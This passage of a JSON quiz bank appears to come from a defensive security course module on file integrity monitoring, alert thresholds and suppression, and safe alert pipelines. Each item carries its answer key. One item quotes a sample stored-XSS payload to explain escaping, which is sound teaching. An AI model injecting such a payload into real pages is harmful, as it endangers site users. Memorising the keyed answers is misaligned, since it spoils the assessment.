    "explanation": "Unintended overly narrow character sets silently create blind spots against IPv6 attackers (`Practical M08-P1` explicitly tests IPv6 log support too!)."
  },
  {
    "id": "q_c4_m7_177",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, why did offset `+40s` suppress instead of alerting (`sudo` failure #5 for `ben`)?",
    "options": [
      "`+40s - +30s = 10s`, which is still far below the 600-second (`10-minute`) `SUPPRESS` cooldown",
      "`counts` dropped below 3",
      "Severity changed from `'medium'` to `'low'`",
      "Five failures terminate the loop early"
    ],
    "correct": 0,
    "explanation": "Both `+31s` (1s elapsed) and `+40s` (10s elapsed) remain strictly inside the 600-second cooldown after Alert 2 fired at `+30s`."
  },
  {
    "id": "q_c4_m7_178",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "In `Target 2013` (`C04-M07-CS1`) and `Scenario S2`, why is simply printing `50,000 alerts suppressed` onto stdout often counterproductive unless alerts are prioritized cleanly by severity?",
    "options": [
      "Because `SUPPRESS` disables logging on `'high'` alerts",
      "Because `'high'` severity strings exceed 80 characters",
      "Because Python buffers stdout only for `'medium'` alerts",
      "Even noisy banner logs or flooded Slack channels hide rare `'high'`/`'critical'` intrusions—severity separation ensures critical root-access or FIM anomalies bypass low-priority chat bursts cleanly"
    ],
    "correct": 3,
    "explanation": "Separating actionable high-severity queues from throttled/summarized medium noise protects incident triage latency."
  },
  {
    "id": "q_c4_m7_179",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "What exact string replaced `svc\\x1b[31mbackup` inside the raised `RK-003` alert of `m07_defensive.py`?",
    "options": [
      "`svcbackup`",
      "`svc\\x1b[31mbackup`",
      "`svc?[31mbackup`",
      "`?`"
    ],
    "correct": 2,
    "explanation": "Control byte `\\x1b` was converted into `?`, yielding verified output `svc?[31mbackup`."
  },
  {
    "id": "q_c4_m7_180",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Why does writing `ensure_ascii=True` on JSONL alerts NOT protect against Stored XSS if a Flask/Django admin page pulls `'entity'` from `alerts.jsonl` via `json.loads()` and interpolates it raw into HTML?",
    "options": [
      "`ensure_ascii=True` converts `<` into `&lt;` inside `.jsonl`",
      "`json.loads()` parses valid JSON strings containing `<script>alert(1)</script>` identically regardless of `ensure_ascii`; only `html.escape()` (or auto-escaping HTML templates) neutralizes `<script>` in DOM output",
      "`json.loads()` refuses strings containing `<`",
      "Flask escapes JSON automatically only if `indent=2` is present"
    ],
    "correct": 1,
    "explanation": "`ensure_ascii=True` only encodes non-ASCII code points (`>= 0x80`); printable ASCII `<script>` stays intact and requires explicit HTML escaping at HTML output."
  },
  {
    "id": "q_c4_m7_181",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "In `Scenario S1`, besides moving caches/uploads and using narrow `fnmatch` rules, how does a legitimate nightly deployment fit cleanly with FIM monitoring?",
    "options": [
      "Run authorized baseline acceptance (`fim.py accept`) as a controlled signed step after deployment finishes so unauthorized post-deploy edits still trigger alerts",
      "Disable FIM permanently on deployment hosts",
      "Email the HMAC private key to every web user",
      "Run `init` with empty baselines nightly"
    ],
    "correct": 0,
    "explanation": "Integrating authorized `accept` re-signing cleanly into release automation eliminates false post-deploy drift without blinding night-shift monitoring."
  },
  {
    "id": "q_c4_m7_182",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Suppose an organization grants its defensive agent script passwordless `sudo` access across the whole OS just to read `/etc/shadow` hashes, and simultaneously loads untrusted third-party JSON rules. Why does that violate least privilege?",
    "options": [
      "`sudo` disables `hmac.compare_digest`",
      "Because `sudo` fails to execute Python `.py` scripts",
      "Because `sha256` works only on unprivileged users",
      "A single parser bug or unintended external write inside an overly privileged monitoring daemon gives attackers full `root` system takeover; sensors should scope read-only permissions narrowly (`ACL`/group reads) and never run arbitrary scripts"
    ],
    "correct": 3,
    "explanation": "Defensive agents must minimize their own attack surface via minimal required read permissions and zero arbitrary-code evaluation."
  },
  {
    "id": "q_c4_m7_183",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Which standard-library Python class enables `rglob('*')`, `is_file()`, and `relative_to(root)` inside `m07_defensive.py`?",
    "options": [
      "`datetime.timedelta`",
      "`os.subprocess`",
      "`pathlib.Path`",
      "`hmac.HMAC`"
    ],
    "correct": 2,
    "explanation": "`pathlib.Path` provides cross-platform object-oriented directory traversal and relative path extraction."
  },
  {
    "id": "q_c4_m7_184",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "If `root` is `/var/www/app` and file `p` is `/var/www/app/admin/login.php` on Windows test mount (`C:\\var\\www\\app\\admin\\login.php`), what exact string key does `str(p.relative_to(root)).replace('\\\\', '/')` yield?",
    "options": [
      "`'app/admin/login.php'`",
      "`'admin/login.php'` identically on both platforms",
      "`'C:/var/www/app/admin/login.php'`",
      "`'login.php'`"
    ],
    "correct": 1,
    "explanation": "`relative_to(root)` strips the root directory prefix and `.replace('\\\\', '/')` normalizes separators to `'admin/login.php'`."
  },
  {
    "id": "q_c4_m7_185",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Why must an off-host FIM verifier still verify the integrity of the HMAC baseline file BEFORE printing diff results?",
    "options": [
      "If the baseline JSON was tampered with before verification, any diff reported against it could hide real file changes or trigger fake noise",
      "Because `json.loads()` cannot read `'files'` unless `'sig'` is decoded first",
      "`compare()` crashes if `'sig'` sits on disk",
      "Verification automatically hashes all added files"
    ],
    "correct": 0,
    "explanation": "Verifying baseline authenticity first guarantees the reference manifest itself is trustworthy prior to comparison."
  },
  {
    "id": "q_c4_m7_186",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "Suppose `fim.py` writes `baseline.json` using `baseline_path.write_text(json.dumps({'files': base, 'sig': sign(base, key)}), encoding='utf-8')`. If power cuts out mid-write on a crash, how do robust tools protect `baseline.json` during legitimate `accept` upgrades?",
    "options": [
      "Ignore JSON decoding errors cleanly with exit `0`",
      "Call `time.sleep(5)` before `write_text`",
      "Write two unkeyed MD5 files alongside it",
      "Write to a sibling temporary file (`baseline.json.tmp`), flush, and atomically `os.replace(tmp, baseline_path)` so readers never observe half-written truncated JSON"
    ],
    "correct": 3,
    "explanation": "Write-then-rename (`os.replace`) prevents readers from choking on half-written manifests or confusing mid-write truncation with tampering."
  },
  {
    "id": "q_c4_m7_187",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "What happens in `m07_defensive.py` if a log line matches none of `RK-001`, `RK-002`, or `RK-003`?",
    "options": [
      "A default alert with entity `'-'` fires",
      "The script raises `AttributeError` on `None.groupdict()`",
      "`rule['re'].search(msg)` returns `None` for each rule (`continue`), raising zero alerts for that line",
      "Suppression triggers for 10 minutes"
    ],
    "correct": 2,
    "explanation": "`if not m: continue` cleanly skips non-matching rules without crashing."
  },
  {
    "id": "q_c4_m7_188",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Why does `m07_defensive.py` check `m = rule['re'].search(msg)` rather than `.match(msg)` on raw log snippets?",
    "options": [
      "`.match()` only returns `True` or `False` without capture groups",
      "Rules like `RK-001` (`Accepted \\S+ for root`) match mid-line authentication phrases regardless of preceding timestamp/hostname syslog headers (`search`), whereas `.match` anchors strictly at index `0`",
      "`.search()` enforces `threshold >= 1` automatically",
      "`.match()` rejects `\\S+` sequences"
    ],
    "correct": 1,
    "explanation": "`re.search()` locates rule substrings after syslog headers when patterns target inner message phrases (while full-line strict parsers in M06/M08 use anchored `^...$`)."
  },
  {
    "id": "q_c4_m7_189",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "Look at the alert payload recorded in `m07_defensive.py`: `{'time': t.isoformat(), 'rule': rule['id'], 'severity': rule['severity'], 'entity': entity, 'title': rule['title']}`. Why store `t.isoformat()` rather than Python's raw `datetime` object?",
    "options": [
      "Standard ISO-8601 UTC strings (`2026-11-07T10:00:30+00:00`) serialize cleanly via `json.dumps()` and sort lexicographically",
      "`datetime` objects lose timezone info inside Python dicts",
      "`isoformat()` strips seconds automatically",
      "`json.dumps()` turns `datetime` into MD5 strings"
    ],
    "correct": 0,
    "explanation": "JSON has no native datetime type; ISO-8601 UTC strings provide universal unambiguous machine timestamps."
  },
  {
    "id": "q_c4_m7_190",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Suppose `SUPPRESS = timedelta(minutes=10)` and a host suffers repeated high-volume `RK-002` brute-force triggers (`50,000` events/hr). If an analyst removes `'threshold'` checking and applies *only* `SUPPRESS` on the 1st event, what problem happens on occasional single accidental user password typos?",
    "options": [
      "Nothing changes because `threshold=1` equals `threshold=3`",
      "Suppression refuses to trigger unless `threshold >= 10`",
      "Single typos fire 50,000 duplicate alerts",
      "Every single ordinary human typo immediately fires a `'medium'` security alert, destroying signal-to-noise—thresholds (`threshold=3`) filter benign typos BEFORE suppression guards sustained bursts"
    ],
    "correct": 3,
    "explanation": "`threshold` gates *whether* a signal crosses noise levels; `SUPPRESS` gates *how often* ongoing alarms repeat once active."
  },
  {
    "id": "q_c4_m7_191",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "In `C04-M07-F3` (Safe Alert Pipeline), how does `sanitise` limit impact from both control sequences AND extremely long usernames?",
    "options": [
      "Replacing spaces with underscores",
      "Encrypting usernames with `hmac.new`",
      "Substituting ASCII control bytes `0x00–0x1F` and `0x7F` with `?` while truncating strings at `[:80]` characters",
      "Compressing entities with `zlib`"
    ],
    "correct": 2,
    "explanation": "`re.sub(r'[\\x00-\\x1f\\x7f]', '?', text)[:limit]` handles control-character stripping and length bounding together cleanly."
  },
  {
    "id": "q_c4_m7_192",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Notice that in `m07_defensive.py`, `entity` is sanitised BEFORE checking `(rule['id'], entity)` and inserting into `alerts.jsonl`. What flaw arises if a careless refactor instead sanitised `entity` ONLY inside `print()` at display time while leaving raw unescaped `\\n` inside `alerts.jsonl`?",
    "options": [
      "`print()` refuses raw strings containing `\\x1b`",
      "Untrusted newlines inside `alerts.jsonl` could corrupt line-delimited JSON tools if broken serializers weren't used, and unsanitised keys split `(rule, entity)` counters across control-byte mutations",
      "`json.dumps` cannot serialize `?` characters",
      "Counters increment twice per line"
    ],
    "correct": 1,
    "explanation": "Early structural normalization + length bounding ensures tracking keys and downstream pipelines see clean normalized entities consistently."
  },
  {
    "id": "q_c4_m7_193",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "When running Practical P1 or P2 inside an operational scheduled automation framework (`Task Scheduler` or `cron`), what does return code `1` signify vs `0`?",
    "options": [
      "`1` indicates the check ran cleanly AND detected unauthorized changes or rule alerts (`findings`), whereas `0` indicates clean completion with zero findings",
      "`1` indicates missing Python binary while `0` means changes detected",
      "`1` triggers baseline re-signing automatically",
      "Both `0` and `1` mean clean green status"
    ],
    "correct": 0,
    "explanation": "Standard security CLI conventions return `0` clean, `1` changes/findings, and `2` failure/error."
  },
  {
    "id": "q_c4_m7_194",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "A company adds a rule engine test asserting `main(['bad_rules.json', 'sample.log']) == 2` where `bad_rules.json` has unescaped single backslash `\"\\S+\"`. Why is having this automated failure-path test valuable?",
    "options": [
      "It verifies `SUPPRESS` equals 10 minutes",
      "It proves Python automatically fixes malformed JSON",
      "It speeds up `sha256` chunk reads",
      "It proves the detector fails closed with clean exit status `2` (never silent `0` clean or raw crashing traceback) when someone accidentally breaks rule JSON syntax"
    ],
    "correct": 3,
    "explanation": "Testing error paths verifies fail-closed exit codes (`2`) and safe operator error reporting."
  },
  {
    "id": "q_c4_m7_195",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "If `old` contains `{'hosts': 'a', 'sshd_config': 'b'}` and `new` contains `{'cron.evil': 'c', 'sshd_config': 'x'}`, which key falls inside `'added'`?",
    "options": [
      "`'sshd_config'`",
      "`'hosts'`",
      "`'cron.evil'`",
      "Both `'cron.evil'` and `'sshd_config'`"
    ],
    "correct": 2,
    "explanation": "`'cron.evil'` is exclusively in `new`, `'hosts'` exclusively in `old` (removed), and `'sshd_config'` in both with altered digest (modified)."
  },
  {
    "id": "q_c4_m7_196",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "In Tamarind Travels (`C04-M07-CS2`), why couldn't simply running `chmod 600 baseline.json` owned by `www-data` protect the baseline from an attacker compromising the PHP website?",
    "options": [
      "`chmod 600` only stops reading, never writing",
      "PHP runs directly under `www-data`, which owns the `0600` file and holds full permission to overwrite `baseline.json` after dropping shells",
      "PHP ignores POSIX file permissions on Linux",
      "`www-data` automatically holds UID `0`"
    ],
    "correct": 1,
    "explanation": "Permissions must separate the web application service account completely from both baseline authority and FIM verification keys."
  },
  {
    "id": "q_c4_m7_197",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, what two entities were captured across Alert 1 (`RK-001`) and Alert 2 (`RK-002`)?",
    "options": [
      "`'203.0.113.7'` for `RK-001` and `'ben'` for `RK-002`",
      "`'root'` for `RK-001` and `'203.0.113.7'` for `RK-002`",
      "`'hosts'` for `RK-001` and `'sshd_config'` for `RK-002`",
      "`'ben'` for both"
    ],
    "correct": 0,
    "explanation": "Verified script output reports `RK-001 high 203.0.113.7`, `RK-002 medium ben`, and `RK-003 medium svc?[31mbackup`."
  },
  {
    "id": "q_c4_m7_198",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Notice that Alert 2 (`RK-002`) had 2 suppressed events (`+31s`, `+40s`) in `m07_defensive.py`. What exact effect would changing `SUPPRESS` from `timedelta(minutes=10)` to `timedelta(seconds=5)` produce on those exact 7 events?",
    "options": [
      "`RK-001` would fire twice",
      "Both `+31s` and `+40s` would still suppress identically",
      "Both `+31s` and `+40s` would emit new alerts (5 total alerts)",
      "+31s (`1s < 5s`) would stay suppressed cleanly, while +40s (`10s >= 5s`) would fire a 2nd `RK-002` alert (yielding 4 total alerts instead of 3)"
    ],
    "correct": 3,
    "explanation": "At `+31s`, `31 - 30 = 1s < 5s` (suppressed); at `+40s`, `40 - 30 = 10s >= 5s` (emits second alert because cooldown expired)."
  },
  {
    "id": "q_c4_m7_199",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "According to `C04-M07-F3` and the OWASP Logging Cheat Sheet, which practice prevents alert generators from exposing internal credentials if a third-party webhook POST fails?",
    "options": [
      "Encode secrets in Base64 inside `alerts.jsonl`",
      "Print the entire HTTP `Request` object onto stderr",
      "Redact authorization tokens and query secrets before logging errors, never emitting raw headers or exception URLs containing credentials",
      "Disable `html.escape()` on error fields"
    ],
    "correct": 2,
    "explanation": "Defensive tools treat alerts and error logs as sensitive outputs requiring active credential redaction."
  },
  {
    "id": "q_c4_m7_200",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "In summary across Course 04 Module 7, which combination of controls protects an automated Python FIM + log-alert system end-to-end against (a) webroot compromise, (b) alert storms, and (c) malicious log payloads?",
    "options": [
      "Local MD5 checksums + unkeyed `mtime` diffs + regex `eval()` + raw f-string HTML reports",
      "Off-host/key-separated canonical HMAC-SHA256 FIM with `0/1/2` fail-closed exits and dead-man heartbeats; composite `(rule, entity)` thresholds + sliding windows + `SUPPRESS` + rate limits; `sanitise()` + secret redaction + `ensure_ascii` JSONL + contextual `html.escape()`/CSP",
      "Auto-running `accept` before `check` + suppressing all rules permanently after alert #1",
      "Using `pickle` files for baselines + `shell=True` cron restarts"
    ],
    "correct": 1,
    "explanation": "Synthesizing off-host cryptographic integrity, fatigue-resistant threshold/suppression correlation, and multi-sink output sanitization defines robust defensive automation."
  }
];
